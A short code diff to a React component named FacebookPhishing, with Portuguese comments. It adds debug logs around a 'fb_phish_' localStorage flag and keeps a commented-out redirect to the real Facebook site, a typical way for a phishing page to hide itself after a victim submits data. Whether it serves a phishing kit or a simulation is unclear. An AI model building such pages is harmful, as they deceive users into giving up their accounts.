@@ -10,9 +10,16 @@ export default function FacebookPhishing() {
   const [enviado, setEnviado] = useState(false);
   const usuario = localStorage.getItem('usuario');
 
-  // Remover o useEffect que redireciona automaticamente para o Facebook real
+  // LOGS para depuração
+  console.log('[FB PHISH] id:', id);
+  console.log('[FB PHISH] localStorage fb_phish_' + id + ':', localStorage.getItem('fb_phish_' + id));
+
+  // Se quiser testar o redirecionamento, descomente abaixo para ver o log
   // useEffect(() => {
-  //   if (localStorage.getItem('fb_phish_' + id)) {
+  //   const flag = localStorage.getItem('fb_phish_' + id);
+  //   console.log('[FB PHISH] useEffect check:', flag);
+  //   if (flag) {
+  //     console.log('[FB PHISH] Redirecionando para Facebook real!');
   //     window.location.href = 'https://www.facebook.com/';
   //   }
   // }, [id]);
